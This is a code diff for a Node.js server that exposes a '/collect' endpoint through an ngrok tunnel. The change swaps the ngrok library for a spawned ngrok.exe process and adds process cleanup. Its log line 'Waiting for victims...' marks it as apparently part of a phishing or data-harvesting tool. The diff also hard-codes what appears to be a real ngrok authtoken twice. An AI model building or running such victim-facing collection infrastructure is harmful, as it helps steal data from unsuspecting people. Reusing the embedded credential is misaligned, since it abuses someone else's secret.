@@ -131,26 +131,65 @@ app.post('/collect', async (req, res) => {
 // ==========================================
 // 🏁 START SERVER & TUNNEL
 // ==========================================
-const ngrok = require('ngrok');
+const { spawn } = require('child_process');
 
 const PORT = 3000;
 app.listen(PORT, async () => {
     console.log(`\n🟢 Local Engine Running:  http://localhost:${PORT}`);
-    console.log(`⌛ Initializing Ngrok Tunnel...`);
+    console.log(`⌛ Initializing Ngrok Tunnel (Direct Mode)...`);
 
-    try {
-        await ngrok.authtoken('384jyF85TZS8gMaK9CAPZ2DYIaF_3aUxYUqYGuqoQnoaaqeEV'); // <--- Sets the token globally
-        const url = await ngrok.connect({
-            proto: 'http',
-            addr: PORT,
-        });
+    // Clean up any old processes first
+    try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }
 
-        console.log(`\n🎉 -----------------------------------------`);
-        console.log(`🚀 PUBLIC LINK: ${url}`);
-        console.log(`🎉 -----------------------------------------\n`);
-        console.log(`Waiting for victims...`);
+    // Start ngrok directly
+    // Command: ngrok http 3000 --authtoken=XXX --log=stdout
+    const ngrokProcess = spawn('ngrok.exe', [
+        'http',
+        PORT.toString(),
+        '--authtoken=384jyF85TZS8gMaK9CAPZ2DYIaF_3aUxYUqYGuqoQnoaaqeEV',
+        '--log=stdout'
+    ], {
+        cwd: __dirname // Ensure we run from the folder containing ngrok.exe
+    });
 
-    } catch (error) {
-        console.error("❌ Ngrok Error:", error.message);
-    }
+    let urlFound = false;
+
+    // Capture Output
+    ngrokProcess.stdout.on('data', (data) => {
+        const output = data.toString();
+        // console.log("Debug Ngrok:", output); // Uncomment if needed
+
+        // Look for URL in logs
+        const match = output.match(/url=(https:\/\/[^ ]+)/);
+        if (match && !urlFound) {
+            urlFound = true;
+            const url = match[1];
+            console.log(`\n🎉 -----------------------------------------`);
+            console.log(`🚀 PUBLIC LINK: ${url}`);
+            console.log(`🎉 -----------------------------------------\n`);
+            console.log(`Waiting for victims...`);
+        }
+    });
+
+    ngrokProcess.stderr.on('data', (data) => {
+        console.error(`Ngrok Error: ${data}`);
+    });
+
+    ngrokProcess.on('close', (code) => {
+        console.log(`Ngrok process exited with code ${code}`);
+    });
+
+    // Cleanup when node dies
+    let cleanupDone = false;
+    const cleanup = () => {
+        if (cleanupDone) return;
+        cleanupDone = true;
+        ngrokProcess.kill();
+        try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }
+        process.exit(0); // <--- IMPORTANT: Actually exit the process!
+    };
+
+    process.on('SIGINT', cleanup);
+    process.on('SIGTERM', cleanup);
+    process.on('exit', cleanup);
 });
